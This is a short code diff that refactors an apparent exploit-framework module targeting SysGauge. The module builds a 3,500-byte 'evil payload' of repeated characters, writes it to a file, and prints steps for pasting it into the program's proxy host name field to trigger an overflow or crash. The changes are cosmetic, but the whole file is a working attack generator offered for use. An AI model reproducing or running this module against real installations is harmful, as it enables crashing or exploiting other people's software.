@@ -12,16 +12,15 @@ class BoomerModule(Module):
         options = {
             "file": ["File to dump payload", "files/output/sysgauge.txt", True]
         }
-        super(BoomerModule, self).__init__(options,info)
-               
+        super(BoomerModule, self).__init__(options, info)
+
     def run(self):
         buffer = "J" * 3500
         try:
-            my_file = open(self.options["file"][1], "w")
-            print("[+] Creating %s bytes evil payload.." % len(buffer))
-            my_file.write(buffer)
-            my_file.close()
-            self.print_ok("%s file created!" % self.options["file"][1])
+            with open(self.options["file"][1], "w") as my_file:
+                print(f"[+] Creating {len(buffer)} bytes evil payload..")
+                my_file.write(buffer)
+            self.print_ok(f'{self.options["file"][1]} file created!')
             self.print_info("""1. Copy content of %s
     2. Select Manual proxy configuration under Options->Proxy
     3. Paste content in 'Proxy Server Host Name' field and click Save""" % self.options["file"][1])
